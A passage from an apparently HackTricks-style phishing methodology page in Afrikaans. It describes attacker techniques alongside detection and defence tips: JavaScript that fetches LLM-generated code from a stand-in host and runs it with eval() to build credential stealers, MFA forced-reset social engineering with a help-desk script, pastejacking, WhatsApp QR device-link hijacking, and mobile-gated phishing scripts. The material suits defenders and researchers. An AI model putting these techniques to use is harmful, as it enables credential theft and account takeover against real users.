3. **Assemble & exec:** konkateniseer die respons en voer dit uit (polymorphic per visit):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** generated code personaliseer die lure (bv. LogoKit token parsing) en plaas creds na die prompt-verborge eindpunt.

**Ontwykingseienskappe**
- Verkeer tref bekende LLM-domains of betroubare CDN-proxies; soms via WebSockets na ’n backend.
- Geen statiese payload nie; malicious JS bestaan slegs ná rendering.
- Nie-deterministiese generasies produseer **unieke stealers** per sessie.

**Deteksie-idees**
- Gebruik sandboxes met JS geaktiveer; merk **runtime `eval`/dynamic script creation sourced from LLM responses**.
- Soek vir front-end POSTs na LLM APIs wat onmiddellik gevolg word deur `eval`/`Function` op teruggestuurde teks.
- Genereer ’n waarskuwing vir ongemagtigde LLM-domains in kliëntverkeer, plus daaropvolgende credential POSTs.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Benewens klassieke push-bombing, **force** operators eenvoudig ’n nuwe MFA-registrasie tydens die help-desk-oproep, waardeur die gebruiker se bestaande token ongeldig gemaak word. Enige daaropvolgende login-prompt verskyn vir die slagoffer as legitiem.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitor vir AzureAD/AWS/Okta-gebeurtenisse waar **`deleteMFA` + `addMFA`** **binne minute vanaf dieselfde IP** plaasvind.



## Clipboard Hijacking / Pastejacking

Aanvallers kan kwaadwillige opdragte stilweg na die slagoffer se knipbord kopieer vanaf ’n gekompromitteerde of typosquatted-webblad en die gebruiker dan mislei om dit binne **Win + R**, **Win + X** of ’n terminaalvenster te plak, waardeur arbitrêre kode uitgevoer word sonder enige aflaai of aanhegsel.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Kwaadwillige App-verspreiding (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* ’n Lokbladsy (bv. ’n vals ministerie/CERT-“channel”) vertoon ’n WhatsApp Web/Desktop-QR-kode en gee die slagoffer opdrag om dit te skandeer, wat die aanvaller stilweg as ’n **linked device** byvoeg.<sup>[[12]](#references)</sup>
* Die aanvaller kry onmiddellik sigbaarheid van kletse en kontakte totdat die sessie verwyder word. Slagoffers kan later ’n “new device linked”-kennisgewing sien; verdedigers kan jag na onverwagte device-link-gebeurtenisse kort ná besoeke aan onbetroubare QR-bladsye.

### Mobile-gated phishing to evade crawlers/sandboxes
Operateurs beperk toenemend toegang tot hul phishing-vloeie agter ’n eenvoudige toestelkontrole sodat desktop-crawlers nooit die finale bladsye bereik nie. ’n Algemene patroon is ’n klein script wat toets of die DOM aanraakvermoë het en die resultaat na ’n bediener-eindpunt stuur; nie-mobiele kliënte ontvang HTTP 500 (of ’n leë bladsy), terwyl mobiele gebruikers die volledige vloei kry.<sup>[[7]](#references)</sup>

Minimal client snippet (tipiese logika):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js`-logika (vereenvoudig):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Servergedrag wat dikwels waargeneem word:
- Stel ’n sessiekoekie tydens die eerste laai.
- Aanvaar `POST /detect {"is_mobile":true|false}`.
- Gee 500 (of ’n plekhouer) vir daaropvolgende GET-versoeke wanneer `is_mobile=false`; bedien phishing slegs indien `true`.

Heuristieke vir opsporing en identifisering:
- urlscan-navraag: `filename:"detect_device.js" AND page.status:500`
- Webtelemetrie: volgorde van `GET /static/detect_device.js` → `POST /detect` → HTTP 500 vir nie-mobiele toestelle; wettige mobiele slagofferpaaie gee 200 terug met daaropvolgende HTML/JS.
- Blokkeer of ondersoek bladsye wat inhoud uitsluitlik op `ontouchstart` of soortgelyke toestelkontroles baseer.

Verdedigingswenke:
- Voer crawlers met mobiele vingerafdrukke en geaktiveerde JS uit om inhoud wat toegang beperk, sigbaar te maak.
- Stel waarskuwings op vir verdagte 500-antwoorde ná `POST /detect` op onlangs geregistreerde domeine.

## References

- [1] [Generering van domeinvariasies wat in phishing gebruik word (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Phishing opspoor: Gereedskap en tegnieke (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Steel geloofsbriewe & omseil 2FA met noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Steel sessies en omseil 2FA met EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Hoe om DKIM met Postfix op Debian Wheezy te installeer en op te stel (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [2025 Unit 42-verslag oor wêreldwye insidentrespons – Sosiale-ingenieurswese-uitgawe](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing – mobiele-beheerde phishing-infrastruktuur en heuristieke (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Die volgende grens van runtime-assembly-aanvalle: Benutting van LLMs om phishing-JavaScript intyds te genereer](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Nabootsing, klik-kaping en TDS: Binne ’n ekosisteem vir malware-verspreiding](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Kaping van verkeer na Microsoft se windows.com met bitflipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Liefde? Eintlik: ’n Valse dating-app as lokmiddel in ’n geteikende spyware-veldtog in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [ESET GhostChat IoCs en monsters](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
